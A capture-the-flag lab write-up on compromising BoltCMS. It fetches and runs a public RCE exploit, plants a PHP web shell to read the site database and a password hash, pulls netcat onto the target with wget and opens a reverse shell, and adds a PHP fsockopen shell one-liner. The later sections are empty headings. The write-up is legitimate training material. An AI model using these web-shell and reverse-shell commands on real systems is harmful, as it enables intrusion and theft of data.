# Erit Securus I

Learn to exploit the BoltCMS software by researching exploit-db.  

- [Erit Securus I](#erit-securus-i)
  - [Tools](#tools)
  - [Reconnaissance](#reconnaissance)
  - [Webserver](#webserver)
  - [Exploit](#exploit)
  - [Reverse Shell](#reverse-shell)
  - [Privilege Escalation](#privilege-escalation)
  - [Pivoting](#pivoting)
  - [Privilege Escalation 2](#privilege-escalation-2)
  - [Root](#root)

## Tools

- nmap
- dirb

## Reconnaissance

`:> nmap -Pn <Target IP>`

10.67.166.205

`dirb http://<Target> <common.txt>`

```md
http://10.67.166.205/entries (CODE:200|SIZE:21065)                                                               
==> DIRECTORY: http://10.67.166.205/extensions/                                                                  
==> DIRECTORY: http://10.67.166.205/files/                                                                       
http://10.67.166.205/index.php (CODE:200|SIZE:20419)                                                             
http://10.67.166.205/pages (CODE:200|SIZE:14482)                                                                 
http://10.67.166.205/search (CODE:200|SIZE:6702)                                                                 
http://10.67.166.205/server-status (CODE:403|SIZE:301)                                                           
==> DIRECTORY: http://10.67.166.205/theme/ 
```

## Webserver

Nothing obvious in the source code  

![CMS](/assets/securus-101.png)  

Username: the most vulnerable username in history
Password: the most vulnerable password in history  

## Exploit

Obtain the exploit  

`:> curl https://raw.githubusercontent.com/r3m0t3nu11/Boltcms-Auth-rce-py/refs/heads/master/exploit.py > exploit.py`

## Reverse Shell

***On The Attacker Box***
`:> python3 exploit.py http:// <victim ip> <username> <password>`

creates access to victim machine..

```md
Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex
[+] Retrieving CSRF token to submit the login form
exploit.py:47: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  token = soup.findAll('input')[2].get("value")
[+] Login token is : 71iR6VRS68_Ne-HOkUY0oj6mIweg1Qtiy2CBjEBJVMI
exploit.py:63: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  token0 = soup0.findAll('input')[6].get("value")
exploit.py:81: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  csrf = soup1.findAll('div')[12].get("data-bolt_csrf_token")
[+] SESSION INJECTION 
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test5
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[+] FOUND  : test15
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
Enter OS command , for exit 'quit' : 
```

`:> ls`  shows a significant number of php files.  

Hunt around a bit..

`:> ls /home/wileec` : there's the flag1.txt
`:> cat /home/wileec/flag1.txt`


Reference the [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)  

Generate a file called `c.php` which contains the line `<?php system($_GET["c"]);?>`  

`:> echo '<?php system($_GET["c"]);?>'>c.php`  

![c file](/assets/securus-102.png)  

***Fun In the Browser***

`http://10.66.185.86/files/c.php?c=find%20/%20-name%20*.db%202%3E/dev/null`  

/var/www/html/app/database/bolt.db  

![find the db](/assets/securus-103.png)  

`http://10.66.185.86/files/c.php?c=cat%20/var/www/html/app/database/bolt.db`  

Since wileec is a boltCMS user, search for the name.... but find "wildone" and the hash.... and an IP address `192.168.100.1`

`$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.`

![search the db](/assets/securus-104.png)  

rip open and find the snickers  

![coyote](/assets/securus-105.png)  



***Back on the attacking machine***

Create a symbolic link in the current working directory that points to the actual installed location of the netcat: `:> ln -s $(which nc) .`  

Set up a server in the current directory: `:> python3 -m http.server 8000`  

***Using a web browser***

Use the browser to activate the c.php file and transfer netcat to the victim device.  

`http://<server>/files/c.php?c=wget http://<attacker>:8000/nc`

The new file requires execution privileges:  

`http://<server>/files/c.php?c=chmod 755 nc`  

***From the Attacking Machine***  

Set up a netcat listener `:> nc -lvnp 9000`  

***From a web browser***

Force the victim machine to establish a connection to the attacker machine  

`http://<victim url>/files/c.php?c=./nc%20-e%20/bin/bash <attacker ip> 9000`

echo "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" > shell.php

## Privilege Escalation

## Pivoting

## Privilege Escalation 2

## Root